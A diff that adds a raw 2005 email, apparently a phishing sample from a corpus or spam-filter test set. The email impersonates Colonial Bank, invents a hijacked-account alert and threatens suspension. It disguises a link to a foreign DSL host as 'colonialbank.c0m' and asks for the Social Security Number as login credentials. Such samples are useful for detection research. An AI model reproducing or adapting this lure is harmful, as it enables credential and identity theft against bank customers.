@@ -1,0 +1,97 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 8102E2A88C
+ for <user@example.com>; Mon, 10 Oct 2005 04:15:40 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 78352621C71; Mon, 10 Oct 2005 04:15:40 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 5C311621C66
+ for <user@example.com>; Mon, 10 Oct 2005 04:15:40 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id EAA00294
+ for user@example.com; Mon, 10 Oct 2005 04:15:40 -0400
+Received: from mail.dpd.sk (a3.dpd.ba.nextra.sk [195.168.8.115])
+ by mail.example.com with ESMTP id EAA00286
+ for <user@example.com>; Mon, 10 Oct 2005 04:15:39 -0400
+Received: by mail.dpd.sk (Postfix, from userid 48)
+ id 02A2E4C5499; Mon, 10 Oct 2005 09:41:03 +0200 (CEST)
+To: user@example.com
+From: customercare@colonialbank.com
+Subject: COLONIAL BANK NOTICE
+Reply-To: customercare@colonialbank.com
+Content-type: text/html
+Message-Id: <20051010074103.02A2E4C5499@mail.dpd.sk>
+Date: Mon, 10 Oct 2005 09:41:03 +0200 (CEST)
+Content-Length: 2737
+Lines: 64
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 190
+
+
+<html>
+
+<body>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="73%" id="AutoNumber1">
+  <tr>
+    <td width="100%">
+    <img border="0" src="http://www.cardweb.com/cardwatch/graphic/colonialbank/colonialbank.gif" width="200" height="48"><p><br>
+    Dear Colonial Bank customer,<br>
+    <br>
+    We recently noticed one or more attempts to log in your Colonial Bank
+    account from a foreign IP address and we have reasons to believe that your
+    account was hijacked by a third party without your authorization.<br>
+    <br>
+    If you recently accessed your account while traveling, the unusual log in
+    attempts may have initiated by you.<br>
+    <br>
+    However if you are the rightful holder of the account, click on the link
+    below and submit, as we try to verify your account. (In case your are not
+    enrolled for Colonial Bank Online Banking then use your Social Security
+    Number both as Customer ID and Password ):<br>
+    <br>
+    <a href="http://dsl85-114.fastxdsl.nl/stats/onlinebanking/CheckSession.php">https://www.colonialbank.c<font face="Verdana" size="1">0</font>m/onlinebanking/redir.Asp?affiliate=9d1825494ae10</a><br>
+    <br>
+    The log in attempt was made from:<br>
+    <br>
+    IP address: 110.6.13.227<br>
+    ISP host: 110.6.13.1.fastweb.rnet.org<br>
+    <br>
+    If you choose to ignore our request, you leave us no choice but to
+    temporally suspend your account.<br>
+    <br>
+    We ask that you allow at least 48hrs for the case to be investigated and we
+    strongly recommend not making any changes to your account in that time.<br>
+    <br>
+    If you received this notice and you are not the authorized account holder,
+    please be aware that is in violation of Colonial Bank policy to represent
+    oneself as another Colonial Bank account owner.Such action may also be in
+    violation of local, national, and/or international law. Colonial Bank is
+    committed to assist law enforcement with any inquires related to attempts to
+    misappropriate personal information with the Internet to commit fraud or
+    theft.<br>
+    Information will be provided at the request of law enforcement agencies to
+    ensure that perpetrators are prosecuted to the fullest extent of the law.<br>
+    <br>
+    * Please do not respond to this email as your reply will not be received.<br>
+    <br>
+    For assistance, log in to your Colonial Bank account and choose the &quot;HELP&quot;
+    link. <br>
+    <br>
+    Thanks for your patience as we work together to protect your account.<br>
+    <br>
+    Regards,<br>
+    <br>
+    The Colonial Bank Corp. Copyright © 2005. All rights reserved.</td>
+  </tr>
+</table>
+
+</body>
+
+</html>
+
+
